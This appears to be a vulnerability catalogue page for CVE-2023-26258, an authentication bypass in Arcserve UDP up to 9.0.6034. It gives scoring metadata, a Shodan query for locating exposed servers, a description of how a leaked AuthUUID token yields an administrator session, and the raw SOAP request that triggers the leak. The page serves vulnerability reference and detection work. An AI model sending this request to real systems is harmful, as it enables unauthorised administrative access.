_cves/cve-2023-26258.md

---
layout: "post"
cve_id: "CVE-2023-26258"
title: "Arcserve UDP <= 9.0.6034 - Authentication Bypass"
pcap: true
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-26258.yaml"
author: "daffainfo"
severity: "critical"
reference: ['https://www.mdsec.co.uk/2023/06/cve-2023-26258-remote-code-execution-in-arcserve-udp-backup/', 'https://nvd.nist.gov/vuln/detail/CVE-2023-26258']
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: "9.8"
  cve-id: "CVE-2023-26258"
  epss-score: "0.73541"
  epss-percentile: "0.98743"
  cwe-id: "CWE-863"
  cpe: "cpe:2.3:a:arcserve:udp:*:*:*:*:*:*:*:*"
metadata:
  verified: "True"
  max-request: "3"
  vendor: "arcserve"
  product: "udp"
  shodan-query: "http.favicon.hash:-1889244460"
tags: ['cve', 'cve2023', 'arcserve', 'auth-bypass', 'vkev', 'vuln']
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## 🔍 Vulnerability Description
Arcserve UDP through 9.0.6034 allows authentication bypass. The method getVersionInfo at WebServiceImpl/services/FlashServiceImpl leaks the AuthUUID token. This token can be used at /WebServiceImpl/services/VirtualStandbyServiceImpl to obtain a valid session. This session can be used to execute any task as administrator.


## 🌐 HTTP Request
<pre style="background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto;">
POST /WebServiceImpl/services/FlashServiceImpl HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0
Connection: close
Content-Length: 1013
Content-Type: text/xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
  <S:Body>
    <ns2:getVersionInfo
        xmlns:ns2="http://webservice.arcflash.ca.com"
        xmlns:ns3="http://backup.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns4="http://data.webservice.arcflash.ca.com/xsd"
        xmlns:ns5="http://export.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns6="http://vsphere.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns7="http://browse.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns8="http://restore.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns9="http://catalog.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns10="http://activitylog.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns11="http://remotedeploy.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns12="http://history.job.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns13="http://webservice.edge.arcserve.ca.com/"/>
  </S:Body>
</S:Envelope>
</pre>
